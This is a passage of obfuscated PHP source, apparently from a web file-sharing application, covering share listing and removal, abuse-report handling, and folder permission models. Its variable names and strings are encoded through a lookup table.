$this->shareEventAdd($ß‡˜ÓäÜ[$è¢€½çô[194]], $¨¾ü›–‚, $è¢€½çô[1980]); $this->where(array($è¢€½çô[2180] => $œ¿ı¿àş))->save($Ôßî£ü); if (isset($¨¾ü›–‚[$è¢€½çô[2168]])) { $this->_shareAuthSet($œ¿ı¿àş, $¨¾ü›–‚[$è¢€½çô[2168]]); } return !0; } private function _checkLinkShare($«íõºıï, $õ„û’˜‡) { $ÁÁ«ÉÍ° =& $_SERVER[Î·Ü›öğ]; if ($«íõºıï[$ÁÁ«ÉÍ°[575]] != $ÁÁ«ÉÍ°[91]) { return; } $™ª‰êÔ× = $õ„û’˜‡[$ÁÁ«ÉÍ°[90]][$ÁÁ«ÉÍ°[194]]; if ($õ„û’˜‡[$ÁÁ«ÉÍ°[90]][$ÁÁ«ÉÍ°[33]] != $ÁÁ«ÉÍ°[233]) { $¶ï¤Ø±÷ = $this->_folderReport($™ª‰êÔ×); if (!$¶ï¤Ø±÷) { return; } show_json(LNG($ÁÁ«ÉÍ°[2186]) . $ÁÁ«ÉÍ°[2187] . $¶ï¤Ø±÷, !1); } $¯´Äñ› = Model($ÁÁ«ÉÍ°[922])->fileInfoGet($õ„û’˜‡[$ÁÁ«ÉÍ°[90]][$ÁÁ«ÉÍ°[194]]); if (!$¯´Äñ›) { return; } $‘åº²–Ğ = $this->shareFileMeta($¯´Äñ›[$ÁÁ«ÉÍ°[554]]); if (isset($‘åº²–Ğ[$ÁÁ«ÉÍ°[452]]) && $‘åº²–Ğ[$ÁÁ«ÉÍ°[452]] == $ÁÁ«ÉÍ°[91]) { show_json(LNG($ÁÁ«ÉÍ°[2188]), !1); } } private function _folderReport($Ï¯Œêˆ¡) { $¨‹Úà ‰ =& $_SERVER[Î·Ü›öğ]; $õÔĞ®àã = array($¨‹Úà ‰[554] => array($¨‹Úà ‰[1111], 0), $¨‹Úà ‰[839] => 3); $²ğş ¾ = Model($¨‹Úà ‰[2189])->where($õÔĞ®àã)->field($¨‹Úà ‰[554])->select(); if (!$²ğş ¾) { return !1; } $²ğş ¾ = array_to_keyvalue($²ğş ¾, $¨‹Úà ‰[12], $¨‹Úà ‰[554]); $·âÂâÓ„ = $¨‹Úà ‰[50] . $Ï¯Œêˆ¡ . $¨‹Úà ‰[50]; $õÔĞ®àã = array($¨‹Úà ‰[554] => array($¨‹Úà ‰[7], $²ğş ¾), $¨‹Úà ‰[597] => array($¨‹Úà ‰[461], "\45{$·âÂâÓ„}\x25"), $¨‹Úà ‰[516] => 0); $¿âÍëˆ = Model($¨‹Úà ‰[922])->where($õÔĞ®àã)->field($¨‹Úà ‰[2190])->find(); if (!$¿âÍëˆ) { return !1; } $¦³Ä‘†° = substr($¿âÍëˆ[$¨‹Úà ‰[597]], strpos($¿âÍëˆ[$¨‹Úà ‰[597]], $·âÂâÓ„)); $õÔĞ®àã = array($¨‹Úà ‰[194] => array($¨‹Úà ‰[7], trim($¦³Ä‘†°, $¨‹Úà ‰[50]))); $í½ûòü = Model($¨‹Úà ‰[922])->where($õÔĞ®àã)->field($¨‹Úà ‰[32])->select(); $üÜí´Ê = array_to_keyvalue($í½ûòü, $¨‹Úà ‰[12], $¨‹Úà ‰[32]); $üÜí´Ê[] = $¿âÍëˆ[$¨‹Úà ‰[32]]; return implode($¨‹Úà ‰[8], $üÜí´Ê); } protected function remove($Ã¤°íÌÑ) { $àÒ¯àË¡ =& $_SERVER[Î·Ü›öğ]; $÷Üş¹ = is_array($Ã¤°íÌÑ) ? $Ã¤°íÌÑ : array($Ã¤°íÌÑ); for ($÷ôçÃ = 0; $÷ôçÃ < count($÷Üş¹); $÷ôçÃ++) { $ÏØ¶…ìÖ = $this->getInfo($÷Üş¹[$÷ôçÃ]); if ($ÏØ¶…ìÖ[$àÒ¯àË¡[679]] == $àÒ¯àË¡[91]) { Model($àÒ¯àË¡[649])->eventShare($ÏØ¶…ìÖ[$àÒ¯àË¡[194]], $àÒ¯àË¡[2174]); } if ($ÏØ¶…ìÖ[$àÒ¯àË¡[575]] == $àÒ¯àË¡[91]) { Model($àÒ¯àË¡[649])->eventShare($ÏØ¶…ìÖ[$àÒ¯àË¡[194]], $àÒ¯àË¡[2173]); } $this->shareInfoMofify($ÏØ¶…ìÖ, $àÒ¯àË¡[2158]); } $è¯©´ôù = array($àÒ¯àË¡[681] => array($àÒ¯àË¡[7], $÷Üş¹)); $âÖàÇğ‹ = $this->where($è¯©´ôù)->delete(); if ($âÖàÇğ‹) { Model($àÒ¯àË¡[682])->where($è¯©´ôù)->delete(); } return $âÖàÇğ‹; } protected function removeBySource($×å•”ı) { $ÁÈ›Ö– =& $_SERVER[Î·Ü›öğ]; $•…Ş“µ½ = array($ÁÈ›Ö–[502] => array($ÁÈ›Ö–[503], $×å•”ı)); $´îèÅ™Ñ = $this->field($ÁÈ›Ö–[681])->where($•…Ş“µ½)->select(); $öÖŒûé² = array_to_keyvalue($´îèÅ™Ñ, $ÁÈ›Ö–[12], $ÁÈ›Ö–[681]); if (!$öÖŒûé²) { return; } foreach ($´îèÅ™Ñ as $ÜÕĞàÈ‰) { $this->shareInfoMofify($ÜÕĞàÈ‰, $ÁÈ›Ö–[2158]); } $•…Ş“µ½ = array($ÁÈ›Ö–[2180] => array($ÁÈ›Ö–[503], $öÖŒûé²)); $this->where($•…Ş“µ½)->delete(); Model($ÁÈ›Ö–[682])->where($•…Ş“µ½)->delete(); } public function listAll($ûÑµŒºÒ) { $ÕôÅ‹ËŞ =& $_SERVER[Î·Ü›öğ]; $ñÆñÈ = array(); if ($ûÑµŒºÒ[$ÕôÅ‹ËŞ[1810]]) { $ñÆñÈ[$ÕôÅ‹ËŞ[1810]] = $ûÑµŒºÒ[$ÕôÅ‹ËŞ[1810]]; } if ($ûÑµŒºÒ[$ÕôÅ‹ËŞ[850]]) { $â§Ù§Ûœ = $ûÑµŒºÒ[$ÕôÅ‹ËŞ[851]] ? $ûÑµŒºÒ[$ÕôÅ‹ËŞ[851]] : strtotime(date($ÕôÅ‹ËŞ[2191])); $ñÆñÈ[$ÕôÅ‹ËŞ[234]] = array($ÕôÅ‹ËŞ[410], array($ûÑµŒºÒ[$ÕôÅ‹ËŞ[850]], $â§Ù§Ûœ)); } if ($ûÑµŒºÒ[$ÕôÅ‹ËŞ[33]]) { $ñÆñÈ[$ûÑµŒºÒ[$ÕôÅ‹ËŞ[33]]] = 1; } else { $ñÆñÈ[] = array($ÕôÅ‹ËŞ[575] => array($ÕôÅ‹ËŞ[1111], 0), $ÕôÅ‹ËŞ[679] => array($ÕôÅ‹ËŞ[1111], 0), $ÕôÅ‹ËŞ[2162] => $ÕôÅ‹ËŞ[2112]); } if ($ûÑµŒºÒ[$ÕôÅ‹ËŞ[2108]]) { $ñÆñÈ[] = array($ÕôÅ‹ËŞ[2159] => $ûÑµŒºÒ[$ÕôÅ‹ËŞ[2108]], $ÕôÅ‹ËŞ[1696] => array($ÕôÅ‹ËŞ[461], "\45{$ûÑµŒºÒ[$ÕôÅ‹ËŞ[2108]]}\45"), $ÕôÅ‹ËŞ[2162] => $ÕôÅ‹ËŞ[2112]); } $æ¾­àü = $this->_makeOrder()->where($ñÆñÈ)->selectPage(20); if (empty($æ¾­àü[$ÕôÅ‹ËŞ[447]])) { return array(); } $this->_listDataApply($æ¾­àü[$ÕôÅ‹ËŞ[447]]); return $æ¾­àü; } public function listDataApply($¶ª³ìš¦) { $this->_listDataApply($¶ª³ìš¦); return $¶ª³ìš¦; } private function _listDataApply(&$‚ù©ğàÜ) { $ÉÆÜéË =& $_SERVER[Î·Ü›öğ]; $—şŞ—ÜÆ = array_to_keyvalue($‚ù©ğàÜ, $ÉÆÜéË[12], $ÉÆÜéË[1810]); $ØËıø¬£ = Model($ÉÆÜéË[610])->userListInfo(array_unique($—şŞ—ÜÆ)); $ÄŠ†şª• = array_to_keyvalue($‚ù©ğàÜ, $ÉÆÜéË[12], $ÉÆÜéË[194]); $ù÷Ä´Ÿ = Model($ÉÆÜéË[922])->sourceListInfo($ÄŠ†şª•, !0); foreach ($‚ù©ğàÜ as $äÎƒÅ·Û => &$ñÅó«àÇ) { $£ú¶Û½ü = $ñÅó«àÇ[$ÉÆÜéË[1810]]; $ñÅó«àÇ[$ÉÆÜéË[2192]] = $ØËıø¬£[$£ú¶Û½ü] ? $ØËıø¬£[$£ú¶Û½ü] : !1; if (!$ñÅó«àÇ[$ÉÆÜéË[2192]] || $ñÅó«àÇ[$ÉÆÜéË[2192]][$ÉÆÜéË[839]] != $ÉÆÜéË[91]) { unset($‚ù©ğàÜ[$äÎƒÅ·Û]); continue; } $Ï†“»Ó = $ñÅó«àÇ[$ÉÆÜéË[194]]; $ñÅó«àÇ[$ÉÆÜéË[90]] = $ù÷Ä´Ÿ[$Ï†“»Ó] ? $ù÷Ä´Ÿ[$Ï†“»Ó] : !1; if ($ñÅó«àÇ[$ÉÆÜéË[90]][$ÉÆÜéË[516]] == $ÉÆÜéË[91]) { unset($‚ù©ğàÜ[$äÎƒÅ·Û]); } if ($ñÅó«àÇ[$ÉÆÜéË[90]] != $ÉÆÜéË[231] && !$ñÅó«àÇ[$ÉÆÜéË[90]]) { unset($‚ù©ğàÜ[$äÎƒÅ·Û]); } } unset($ñÅó«àÇ); $‚ù©ğàÜ = array_values($‚ù©ğàÜ); } private function _makeOrder($Ù˜æÆˆ¯ = '') { $êâ»·ì» =& $_SERVER[Î·Ü›öğ]; $Æ™½ìè¼ = array($êâ»·ì»[234], $êâ»·ì»[851], $êâ»·ì»[2176], $êâ»·ì»[2177]); $Áı½µ´‘ = array($êâ»·ì»[534] => $êâ»·ì»[535], $êâ»·ì»[536] => $êâ»·ì»[537]); $ŸÇÙÀãÖ = Input::get($êâ»·ì»[541], $êâ»·ì»[7], $êâ»·ì»[508], $Æ™½ìè¼); $­üÇ»ë™ = Input::get($êâ»·ì»[542], $êâ»·ì»[7], $êâ»·ì»[2193], array($êâ»·ì»[2105], $êâ»·ì»[536])); $­üÇ»ë™ = $Áı½µ´‘[$­üÇ»ë™]; $Ù˜æÆˆ¯ = $Ù˜æÆˆ¯ . "{$ŸÇÙÀãÖ}\40{$­üÇ»ë™}"; return $this->order($Ù˜æÆˆ¯); } public function reportAdd($ÖÕì’Ş‚) { $ßÛõ…Ì¾ =& $_SERVER[Î·Ü›öğ]; $¸õúÔµ÷ = array($ßÛõ…Ì¾[681] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[681]], $ßÛõ…Ì¾[1810] => USER_ID); if (Model($ßÛõ…Ì¾[2189])->where($¸õúÔµ÷)->find()) { return !1; } $—õ“Ÿ¦ø = array($ßÛõ…Ì¾[681] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[681]], $ßÛõ…Ì¾[1696] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[1696]], $ßÛõ…Ì¾[194] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[194]], $ßÛõ…Ì¾[554] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[554]], $ßÛõ…Ì¾[1810] => USER_ID, $ßÛõ…Ì¾[33] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[33]], $ßÛõ…Ì¾[537] => $ÖÕì’Ş‚[$ßÛõ…Ì¾[537]]); return Model($ßÛõ…Ì¾[2189])->add($—õ“Ÿ¦ø); } public function reportList($òÇ·¡î) { $»ì¨èŞÆ =& $_SERVER[Î·Ü›öğ]; $ÖèÔ±©ß = array(); if ($òÇ·¡î[$»ì¨èŞÆ[850]]) { $ÊÆ³·ñØ = $òÇ·¡î[$»ì¨èŞÆ[851]] ? $òÇ·¡î[$»ì¨èŞÆ[851]] : strtotime(date($»ì¨èŞÆ[2191])); $ÖèÔ±©ß[$»ì¨èŞÆ[234]] = array($»ì¨èŞÆ[410], array($òÇ·¡î[$»ì¨èŞÆ[850]], $ÊÆ³·ñØ)); } if (isset($òÇ·¡î[$»ì¨èŞÆ[33]]) && in_array($òÇ·¡î[$»ì¨èŞÆ[33]], array($»ì¨èŞÆ[91], $»ì¨èŞÆ[521], $»ì¨èŞÆ[2194], $»ì¨èŞÆ[2195], $»ì¨èŞÆ[2196]))) { $ÖèÔ±©ß[$»ì¨èŞÆ[33]] = $òÇ·¡î[$»ì¨èŞÆ[33]]; } if (isset($òÇ·¡î[$»ì¨èŞÆ[839]]) && in_array($òÇ·¡î[$»ì¨èŞÆ[839]], array($»ì¨èŞÆ[231], $»ì¨èŞÆ[91], $»ì¨èŞÆ[521], $»ì¨èŞÆ[2194]))) { $ÖèÔ±©ß[$»ì¨èŞÆ[839]] = $òÇ·¡î[$»ì¨èŞÆ[839]]; } $Éİ ñé = Input::get($»ì¨èŞÆ[542], $»ì¨èŞÆ[7], $»ì¨èŞÆ[2193], array($»ì¨èŞÆ[2105], $»ì¨èŞÆ[536])); $°ÇÕ›³ = array($»ì¨èŞÆ[534] => $»ì¨èŞÆ[535], $»ì¨èŞÆ[536] => $»ì¨èŞÆ[537]); $ÑîÜÎç¶ = $»ì¨èŞÆ[2197] . $°ÇÕ›³[$Éİ ñé]; $´€ºõÑÜ = Model($»ì¨èŞÆ[2189])->where($ÖèÔ±©ß)->order($ÑîÜÎç¶)->selectPage(20); if (empty($´€ºõÑÜ[$»ì¨èŞÆ[447]])) { return array(); } $ß§•î¶ = array_to_keyvalue_group($´€ºõÑÜ[$»ì¨èŞÆ[447]], $»ì¨èŞÆ[839], $»ì¨èŞÆ[681]); if (!empty($ß§•î¶[0])) { $òÇ·¡î = $ß§•î¶[0]; $ÖèÔ±©ß = array($»ì¨èŞÆ[681] => array($»ì¨èŞÆ[7], $òÇ·¡î)); $˜²Ôş·“ = $this->where($ÖèÔ±©ß)->field($»ì¨èŞÆ[681])->select(); $˜²Ôş·“ = array_to_keyvalue($˜²Ôş·“, $»ì¨èŞÆ[12], $»ì¨èŞÆ[681]); $ş´½Î = array_diff($òÇ·¡î, $˜²Ôş·“); if (!empty($ş´½Î)) { foreach ($´€ºõÑÜ[$»ì¨èŞÆ[447]] as $ó­ö°¯¥ => $©£¢ôò) { if (in_array($©£¢ôò[$»ì¨èŞÆ[681]], $ş´½Î)) { unset($´€ºõÑÜ[$»ì¨èŞÆ[447]][$ó­ö°¯¥]); } } } } $this->_listDataApply($´€ºõÑÜ[$»ì¨èŞÆ[447]]); return $´€ºõÑÜ; } public function reportStatus($ËŒ±®‰²) { $š×ú…º =& $_SERVER[Î·Ü›öğ]; $Áş¿Š½¶ = array($š×ú…º[477] => $ËŒ±®‰²[$š×ú…º[477]]); $©®…³ú° = Model($š×ú…º[2189])->where($Áş¿Š½¶)->field($š×ú…º[2198])->find(); if (!$©®…³ú°) { return !1; } $¿ˆÎ†¦ = array($š×ú…º[839] => $ËŒ±®‰²[$š×ú…º[839]]); if ($ËŒ±®‰²[$š×ú…º[839]] == $š×ú…º[2194] && $©®…³ú°[$š×ú…º[839]] == $š×ú…º[2194]) { $¿ˆÎ†¦[$š×ú…º[839]] = 0; } $Ó½¬Êğ = Model($š×ú…º[2189])->where($Áş¿Š½¶)->save($¿ˆÎ†¦); if ($ËŒ±®‰²[$š×ú…º[839]] == $š×ú…º[521]) { if ($©®…³ú°[$š×ú…º[554]] != $š×ú…º[231] && $this->shareFileMeta($©®…³ú°[$š×ú…º[554]])) { $this->shareFileMeta($©®…³ú°[$š×ú…º[554]], 0); } $this->remove($©®…³ú°[$š×ú…º[681]]); return !0; } if ($Ó½¬Êğ && $ËŒ±®‰²[$š×ú…º[839]] == $š×ú…º[2194]) { $œ°»Îø– = $¿ˆÎ†¦[$š×ú…º[839]] == $š×ú…º[2194] ? 1 : 0; $this->shareFileMeta($©®…³ú°[$š×ú…º[554]], $œ°»Îø–); $this->removeByFile($©®…³ú°[$š×ú…º[554]]); } return $Ó½¬Êğ; } private function removeByFile($¾ÕÍ”ñÚ) { $ø¬îı¹¾ =& $_SERVER[Î·Ü›öğ]; $§ÓéÎ« = Model($ø¬îı¹¾[922])->where(array($ø¬îı¹¾[554] => $¾ÕÍ”ñÚ))->field($ø¬îı¹¾[194])->select(); $’Ÿ£®İ = array_to_keyvalue($§ÓéÎ«, $ø¬îı¹¾[12], $ø¬îı¹¾[194]); $äªõ‰¤ = array($ø¬îı¹¾[194] => array($ø¬îı¹¾[7], $’Ÿ£®İ), $ø¬îı¹¾[575] => 1); $§ÓéÎ« = $this->where($äªõ‰¤)->field($ø¬îı¹¾[681])->select(); if (empty($§ÓéÎ«)) { return; } $›µŒ‹¸› = array_to_keyvalue($§ÓéÎ«, $ø¬îı¹¾[12], $ø¬îı¹¾[681]); $this->remove($›µŒ‹¸›); } private function shareFileMeta($îÔÉî£, $ìü‘Æ¶’ = null) { $ £¡È÷û =& $_SERVER[Î·Ü›öğ]; $¢ÚıĞÇ‡ = array($ £¡È÷û[554] => $îÔÉî£, $ £¡È÷û[97] => $ £¡È÷û[2199]); if (is_null($ìü‘Æ¶’)) { return Model($ £¡È÷û[2200])->where($¢ÚıĞÇ‡)->find(); } $¢ÚıĞÇ‡[$ £¡È÷û[452]] = $ìü‘Æ¶’; Model($ £¡È÷û[2200])->add($¢ÚıĞÇ‡, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\x75\162\x63\145\137\x61\x75\164\150"; public function getAuth($½ù¤Éæ) { $Ÿ¸ ¡°Ş =& $_SERVER[Î·Ü›öğ]; $ùÙ²Ó– = $this->sourceAuthSelect($½ù¤Éæ); $ÊÃ¤£ÔĞ = array(); $Ğ»‡– = array(); $¹¢¸Ì†– = 2 << 25; foreach ($ùÙ²Ó– as $ë“ø‚Ş‚) { $·® íÓÍ = Model($Ÿ¸ ¡°Ş[584])->listData($ë“ø‚Ş‚[$Ÿ¸ ¡°Ş[2118]]); if (!$·® íÓÍ) { continue; } $ÊÃ¤£ÔĞ[] = $ë“ø‚Ş‚; $Í´¢ûÛ‡ = 0; if ($ë“ø‚Ş‚[$Ÿ¸ ¡°Ş[191]] == SourceModel::TYPE_GROUP) { $Í´¢ûÛ‡ = $¹¢¸Ì†– * 2; } if ($ë“ø‚Ş‚[$Ÿ¸ ¡°Ş[191]] == SourceModel::TYPE_USER) { $Í´¢ûÛ‡ = $¹¢¸Ì†–; } if ($ë“ø‚Ş‚[$Ÿ¸ ¡°Ş[191]] == SourceModel::TYPE_USER && $ë“ø‚Ş‚[$Ÿ¸ ¡°Ş[582]] == $Ÿ¸ ¡°Ş[231]) { $Í´¢ûÛ‡ = 0; } $Ğ»‡–[] = $·® íÓÍ[$Ÿ¸ ¡°Ş[498]] + $Í´¢ûÛ‡; } array_multisort($Ğ»‡–, SORT_DESC, $ÊÃ¤£ÔĞ); return $ÊÃ¤£ÔĞ; } public function sourceAuthSelect($¿®Ñ‡ãí) { $­¨Õ‘ô’ =& $_SERVER[Î·Ü›öğ]; static $ñÇ„ÃÕ‘ = array(); $¡¨÷§ = is_array($¿®Ñ‡ãí) ? !1 : !0; if ($¡¨÷§) { $¿®Ñ‡ãí = array($¿®Ñ‡ãí); } $Ğ¸‚âÍœ = array(); foreach ($¿®Ñ‡ãí as $ö¸µ¤”Á) { if (isset($ñÇ„ÃÕ‘[$ö¸µ¤”Á])) { $Ğ¸‚âÍœ[$ö¸µ¤”Á] = $ñÇ„ÃÕ‘[$ö¸µ¤”Á]; } } if (count($Ğ¸‚âÍœ) == count($¿®Ñ‡ãí)) { return $¡¨÷§ ? $Ğ¸‚âÍœ[$¿®Ñ‡ãí[0]] : $Ğ¸‚âÍœ; } $¤±ëîñš = $­¨Õ‘ô’[2201]; $ÍÅÈñ‹ = array($­¨Õ‘ô’[194] => array($­¨Õ‘ô’[7], $¿®Ñ‡ãí)); $Š¡ÕÇæ† = $this->field($¤±ëîñš)->order($­¨Õ‘ô’[477])->where($ÍÅÈñ‹)->select(); $·£°Ù© = array_to_keyvalue_group($Š¡ÕÇæ†, $­¨Õ‘ô’[194]); foreach ($¿®Ñ‡ãí as $ö¸µ¤”Á) { $ñÇ„ÃÕ‘[$ö¸µ¤”Á] = $·£°Ù©[$ö¸µ¤”Á] ? $·£°Ù©[$ö¸µ¤”Á] : array(); } if ($¡¨÷§) { return $Š¡ÕÇæ†; } return $·£°Ù©; } public function setAuth($Ô»«ò¼³, $ûã²‹ş’) { $‹Í»¯°‚ =& $_SERVER[Î·Ü›öğ]; $ª«»¯ŠÔ = Model($‹Í»¯°‚[1458])->sourceInfo($Ô»«ò¼³); if (!$ª«»¯ŠÔ) { return !1; } if ($ª«»¯ŠÔ[$‹Í»¯°‚[191]] != SourceModel::TYPE_GROUP) { return !1; } $ğÕŠ±¨Ô = 1; $™´ãÓê¯ = $ª«»¯ŠÔ[$‹Í»¯°‚[582]]; if ($™´ãÓê¯ != $ğÕŠ±¨Ô) { $ãƒ¸¦³ = array($‹Í»¯°‚[1420] => $™´ãÓê¯); $Ãù¿œÌ… = Model($‹Í»¯°‚[2104])->field($‹Í»¯°‚[1810])->where($ãƒ¸¦³)->select(); $Ãù¿œÌ… = array_to_keyvalue($Ãù¿œÌ…, $‹Í»¯°‚[12], $‹Í»¯°‚[1810]); } $ú°ûæ¼ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ÉÚ™’¿Ì = array(); foreach ($ûã²‹ş’ as $§“È·ø) { if (!in_array($§“È·ø[$‹Í»¯°‚[191]], $ú°ûæ¼)) { show_json(LNG($‹Í»¯°‚[2202]), !1); } if ($™´ãÓê¯ != $ğÕŠ±¨Ô) { if ($§“È·ø[$‹Í»¯°‚[191]] == SourceModel::TYPE_GROUP) { } if ($§“È·ø[$‹Í»¯°‚[582]] != 0 && !in_array($§“È·ø[$‹Í»¯°‚[582]], $Ãù¿œÌ…)) { } } if ($§“È·ø[$‹Í»¯°‚[582]] == 0) { $§“È·ø[$‹Í»¯°‚[191]] = SourceModel::TYPE_USER; } $ÉÚ™’¿Ì[] = array($‹Í»¯°‚[194] => $Ô»«ò¼³, $‹Í»¯°‚[191] => intval($§“È·ø[$‹Í»¯°‚[191]]), $‹Í»¯°‚[582] => intval($§“È·ø[$‹Í»¯°‚[582]]), $‹Í»¯°‚[2118] => intval($§“È·ø[$‹Í»¯°‚[2118]]) ? intval($§“È·ø[$‹Í»¯°‚[2118]]) : 0, $‹Í»¯°‚[2181] => intval($§“È·ø[$‹Í»¯°‚[2181]]) ? intval($§“È·ø[$‹Í»¯°‚[2181]]) : -1); } $this->where(array($‹Í»¯°‚[502] => $Ô»«ò¼³))->delete(); $this->addAll($ÉÚ™’¿Ì); return !0; } public function authClear($•³­¶÷­) { $óœŠìŞ¡ =& $_SERVER[Î·Ü›öğ]; $—±´ïïÍ = Model($óœŠìŞ¡[1458])->sourceInfo($•³­¶÷­); $ÍÂù¸Ê = array($•³­¶÷­); if ($—±´ïïÍ[$óœŠìŞ¡[496]] == $óœŠìŞ¡[91]) { $çØ‡¢É« = array($óœŠìŞ¡[668] => array($óœŠìŞ¡[628], $—±´ïïÍ[$óœŠìŞ¡[597]] . $•³­¶÷­ . $óœŠìŞ¡[629])); $ÍÂù¸Ê = Model($óœŠìŞ¡[1458])->field($óœŠìŞ¡[502])->where($çØ‡¢É«)->getField($óœŠìŞ¡[194], !0); $ÍÂù¸Ê[] = $•³­¶÷­; } $this->where(array($óœŠìŞ¡[502] => array($óœŠìŞ¡[503], $ÍÂù¸Ê)))->delete(); return !0; } public function getAllParent($Šä‡•è³) { $Ø•Úü‚´ =& $_SERVER[Î·Ü›öğ]; $ĞñÇúçé = Model($Ø•Úü‚´[1458])->sourceInfo($Šä‡•è³); if (!$ĞñÇúçé || $ĞñÇúçé[$Ø•Úü‚´[191]] != SourceModel::TYPE_GROUP) { return array(); } $™Õ£ˆ©— = Model($Ø•Úü‚´[1458])->parentLevelArray($ĞñÇúçé[$Ø•Úü‚´[597]]); $ø²ÆáÎö = array_merge(array(intval($Šä‡•è³)), array_reverse($™Õ£ˆ©—)); $ÙæÅ÷á = $this->sourceAuthSelect($ø²ÆáÎö); $ëìõÒİ… = $GLOBALS[$Ø•Úü‚´[6]][$Ø•Úü‚´[92]][$Ø•Úü‚´[2117]] == 1; $³øèí£ = $ëìõÒİ… ? 3 : 2; $Ì‚ÕªÎ = Model($Ø•Úü‚´[1418])->getInfo($ĞñÇúçé[$Ø•Úü‚´[582]]); $Ùš†ûßÓ = explode($Ø•Úü‚´[50], trim($Ì‚ÕªÎ[$Ø•Úü‚´[597]], $Ø•Úü‚´[50])); $„Æ“ìõ = array_merge(array($Ì‚ÕªÎ[$Ø•Úü‚´[1420]]), array_reverse(array_slice($Ùš†ûßÓ, $³øèí£))); foreach ($ÙæÅ÷á as $Šä‡•è³ => $ç¹»ı’à) { foreach ($ç¹»ı’à as $Šªãò ü) { if (!$Šªãò ü || !$Šªãò ü[$Ø•Úü‚´[582]] || $Šªãò ü[$Ø•Úü‚´[582]] == $Ø•Úü‚´[231]) { continue; } if ($Šªãò ü[$Ø•Úü‚´[191]] != SourceModel::TYPE_GROUP) { continue; } $„Æ“ìõ[] = $Šªãò ü[$Ø•Úü‚´[582]]; } } $„Æ“ìõ = array_unique($„Æ“ìõ); $Ñş½³ƒÉ = array($Ø•Úü‚´[430] => _get($GLOBALS[$Ø•Úü‚´[7]], $Ø•Úü‚´[430], 1), $Ø•Úü‚´[441] => _get($GLOBALS[$Ø•Úü‚´[7]], $Ø•Úü‚´[441], 500)); $GLOBALS[$Ø•Úü‚´[7]][$Ø•Úü‚´[430]] = 1; $GLOBALS[$Ø•Úü‚´[7]][$Ø•Úü‚´[441]] = 500; $­Ø‘¹Ã„ = array($Ø•Úü‚´[504] => 0, $Ø•Úü‚´[2016] => AuthModel::authAll(), $Ø•Úü‚´[505] => LNG($Ø•Úü‚´[2203]), $Ø•Úü‚´[2033] => $Ø•Úü‚´[2204]); $ö¥ß°ÒÄ = array(); $¶ÔÄœÕÎ = explode($Ø•Úü‚´[50], $Ø•Úü‚´[2205]); $°ÌçÉ° = explode($Ø•Úü‚´[50], $Ø•Úü‚´[2206]); foreach ($„Æ“ìõ as $±€¦³£ó) { $°»şÄ½ = Model($Ø•Úü‚´[1418])->getInfo($±€¦³£ó); $¨÷éï¶ = array_field_key($°»şÄ½, $¶ÔÄœÕÎ); $³¥ ğç = Model($Ø•Úü‚´[610])->listByGroup($±€¦³£ó); foreach ($³¥ ğç[$Ø•Úü‚´[447]] as $èÅóïÔ => $†¡óß©) { $this->userGroupList($†¡óß©[$Ø•Úü‚´[1810]], $†¡óß©); $Ü€—Ñš = $†¡óß©[$Ø•Úü‚´[1810]] . $Ø•Úü‚´[12]; if (isset($ö¥ß°ÒÄ[$Ü€—Ñš])) { continue; } $¾ïï’¼ = Model($Ø•Úü‚´[2207])->listData($†¡óß©[$Ø•Úü‚´[2208]]); $†¡óß©[$Ø•Úü‚´[2209]] = Action($Ø•Úü‚´[2210])->parseUrl($†¡óß©[$Ø•Úü‚´[2209]]); $†¡óß©[$Ø•Úü‚´[1774]] = $¾ïï’¼ && $¾ïï’¼[$Ø•Úü‚´[2211]] == 1; $İùàåÏş = $this->groupRootAuth($±€¦³£ó, $†¡óß©[$Ø•Úü‚´[1810]]); $İùàåÏş = $†¡óß©[$Ø•Úü‚´[1774]] ? $­Ø‘¹Ã„ : $İùàåÏş; $ö¥ß°ÒÄ[$Ü€—Ñš] = array($Ø•Úü‚´[2212] => $Ø•Úü‚´[2213], $Ø•Úü‚´[2214] => LNG($Ø•Úü‚´[2215]), $Ø•Úü‚´[2192] => array_field_key($†¡óß©, $°ÌçÉ°), $Ø•Úü‚´[498] => $İùàåÏş, $Ø•Úü‚´[499] => $İùàåÏş[$Ø•Úü‚´[498]], $Ø•Úü‚´[2216] => $¨÷éï¶); } } $GLOBALS[$Ø•Úü‚´[7]][$Ø•Úü‚´[430]] = $Ñş½³ƒÉ[$Ø•Úü‚´[430]]; $GLOBALS[$Ø•Úü‚´[7]][$Ø•Úü‚´[441]] = $Ñş½³ƒÉ[$Ø•Úü‚´[441]]; foreach ($ÙæÅ÷á as $Šä‡•è³ => $ç¹»ı’à) { if (!$ç¹»ı’à) { continue; } foreach ($ç¹»ı’à as $Šªãò ü) { if (!$Šªãò ü || !$Šªãò ü[$Ø•Úü‚´[582]] || $Šªãò ü[$Ø•Úü‚´[582]] == $Ø•Úü‚´[231]) { continue; } if ($Šªãò ü[$Ø•Úü‚´[191]] != SourceModel::TYPE_USER) { continue; } $Ü€—Ñš = $Šªãò ü[$Ø•Úü‚´[582]] . $Ø•Úü‚´[12]; if (isset($ö¥ß°ÒÄ[$Ü€—Ñš])) { continue; } $àùäÉ—— = $this->authMake($ç¹»ı’à, $Ü€—Ñš); if (!$àùäÉ—— || !$àùäÉ——[$Ø•Úü‚´[2214]]) { continue; } $ö¥ß°ÒÄ[$Ü€—Ñš] = array($Ø•Úü‚´[2212] => $Ø•Úü‚´[2217], $Ø•Úü‚´[2214] => $àùäÉ——[$Ø•Úü‚´[2214]], $Ø•Úü‚´[2192] => Model($Ø•Úü‚´[610])->getInfoSimpleOuter($Ü€—Ñš), $Ø•Úü‚´[498] => $àùäÉ——[$Ø•Úü‚´[553]], $Ø•Úü‚´[499] => $àùäÉ——[$Ø•Úü‚´[553]][$Ø•Úü‚´[498]], $Ø•Úü‚´[2216] => $àùäÉ——[$Ø•Úü‚´[2218]]); } } foreach ($ÙæÅ÷á as $Šä‡•è³ => $ç¹»ı’à) { if (!$ç¹»ı’à) { continue; } foreach ($ö¥ß°ÒÄ as $Ü€—Ñš => $Ÿ¹Çì¸‚) { if ($Ÿ¹Çì¸‚[$Ø•Úü‚´[2192]][$Ø•Úü‚´[1774]] || $Ÿ¹Çì¸‚[$Ø•Úü‚´[2212]] == $Ø•Úü‚´[2217]) { 